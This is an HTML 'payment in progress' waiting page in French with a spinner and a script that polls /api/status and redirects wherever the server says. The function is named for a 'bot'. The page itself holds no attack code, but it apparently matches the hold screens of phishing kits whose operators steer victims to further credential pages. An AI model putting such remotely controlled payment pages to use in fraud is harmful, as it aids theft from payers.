<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Attente Paiement</title>
<style>
body{font-family:Arial;text-align:center;padding:60px;}
.spinner{
  border: 12px solid #f3f3f3;
  border-top: 12px solid #007bff;
  border-radius: 50%;
  width: 80px;
  height: 80px;
  animation: spin 1.5s linear infinite;
  margin: auto;
}
@keyframes spin { 0% { transform: rotate(0deg);} 100% { transform: rotate(360deg);} }
</style>
</head>
<body>
<h1>‚è≥ Paiement en cours...</h1>
<div class="spinner"></div>

<script>
async function checkBotRedirect() {
  try{
    const res = await fetch('/api/status');
    const data = await res.json();
    if(data.redirect && window.location.pathname !== data.redirect){
      window.location.href = data.redirect;
    } else { setTimeout(checkBotRedirect,2000);}
  } catch(e){ setTimeout(checkBotRedirect,2000);}
}
checkBotRedirect();
</script>
</body>
</html>
